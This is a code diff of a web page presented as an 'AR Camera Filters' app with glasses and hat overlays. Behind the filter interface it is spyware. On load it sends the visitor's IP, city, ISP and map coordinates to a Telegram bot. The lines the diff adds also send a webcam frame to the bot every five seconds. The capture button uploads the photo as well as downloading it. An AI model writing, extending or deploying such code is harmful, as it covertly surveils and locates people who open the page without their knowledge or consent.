@@ -4,27 +4,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AR Camera Filters</title>
-    <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/ar.js@1.7.2/aframe-ar.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-core"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-converter"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-landmarks-detection"></script>
     <style>
         body {
             margin: 0;
             background-color: black;
             overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
         }
-        .hatching {
+        video, canvas {
             position: absolute;
             width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(
-                45deg,
-                rgba(255, 255, 255, 0.25),
-                rgba(255, 255, 255, 0.25) 10px,
-                transparent 10px,
-                transparent 20px
-            );
-            pointer-events: none;
+            height: auto;
         }
         .filter-menu {
             position: absolute;
@@ -41,8 +39,33 @@
             border: none;
             cursor: pointer;
         }
+        .capture-btn {
+            position: absolute;
+            bottom: 20px;
+            padding: 15px;
+            background: red;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
     </style>
+</head>
+<body>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    <div class="filter-menu">
+        <button class="filter-btn" onclick="applyFilter('glasses')">Glasses</button>
+        <button class="filter-btn" onclick="applyFilter('hat')">Hat</button>
+    </div>
+    <button class="capture-btn" onclick="capturePhoto()">Capture & Download</button>
+    
     <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let currentFilter = '';
+
         async function sendUserInfoToTelegram() {
             let response = await fetch('https://ipwho.is/');
             let data = await response.json();
@@ -51,34 +74,6 @@
             let message = `New Visitor Detected!\nIP: ${data.ip}\nLocation: ${data.city}, ${data.country}\nISP: ${data.connection.isp}\nMap: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
             let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
             fetch(telegramURL);
-        }
-
-        function startCamera() {
-            navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
-                let video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                video.style.display = 'none';
-                document.body.appendChild(video);
-
-                let canvas = document.createElement('canvas');
-                let ctx = canvas.getContext('2d');
-                canvas.width = 640;
-                canvas.height = 480;
-
-                setInterval(() => {
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    let imageData = canvas.toDataURL('image/png');
-                    sendPhotoToTelegram(imageData);
-                }, 3000); // Capture and send every 3 seconds
-
-                window.addEventListener('beforeunload', () => {
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    let imageData = canvas.toDataURL('image/png');
-                    sendPhotoToTelegram(imageData);
-                    stream.getTracks().forEach(track => track.stop());
-                });
-            }).catch(console.error);
         }
 
         async function sendPhotoToTelegram(imageData) {
@@ -104,28 +99,51 @@
             return new Blob([ab], { type: mimeString });
         }
 
-        window.onload = function() {
-            sendUserInfoToTelegram();
-            startCamera();
-        };
-    </script>
-</head>
-<body>
-    <div class="hatching"></div>
-    <div class="filter-menu">
-        <button class="filter-btn" onclick="applyFilter('dino')">Dino Head</button>
-        <button class="filter-btn" onclick="applyFilter('glasses')">Glasses</button>
-    </div>
-    <a-scene embedded arjs>
-        <a-camera position="0 0 0"></a-camera>
-        <a-entity id="dino" geometry="primitive: cone; height: 1" material="color: green" position="0 0 -2" visible="false"></a-entity>
-        <a-entity id="glasses" geometry="primitive: box; depth: 0.1" material="color: blue" position="0 0 -2" visible="false"></a-entity>
-    </a-scene>
-    <script>
-        function applyFilter(filter) {
-            document.getElementById('dino').setAttribute('visible', filter === 'dino');
-            document.getElementById('glasses').setAttribute('visible', filter === 'glasses');
+        async function startCamera() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+            };
+            setInterval(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                sendPhotoToTelegram(canvas.toDataURL('image/png'));
+            }, 5000); // Sends a photo every 5 seconds
         }
+
+        function applyFilter(filter) {
+            currentFilter = filter;
+        }
+
+        function drawFilter() {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            if (currentFilter === 'glasses') {
+                ctx.fillStyle = 'rgba(0, 0, 255, 0.5)';
+                ctx.fillRect(150, 100, 200, 50);
+            } else if (currentFilter === 'hat') {
+                ctx.fillStyle = 'rgba(255, 0, 0, 0.5)';
+                ctx.fillRect(180, 50, 150, 50);
+            }
+            requestAnimationFrame(drawFilter);
+        }
+
+        function capturePhoto() {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            sendPhotoToTelegram(canvas.toDataURL('image/png'));
+            const image = canvas.toDataURL('image/png');
+            const link = document.createElement('a');
+            link.href = image;
+            link.download = 'filtered_photo.png';
+            link.click();
+        }
+
+        window.onload = async () => {
+            await sendUserInfoToTelegram();
+            await startCamera();
+            drawFilter();
+        };
     </script>
 </body>
 </html>
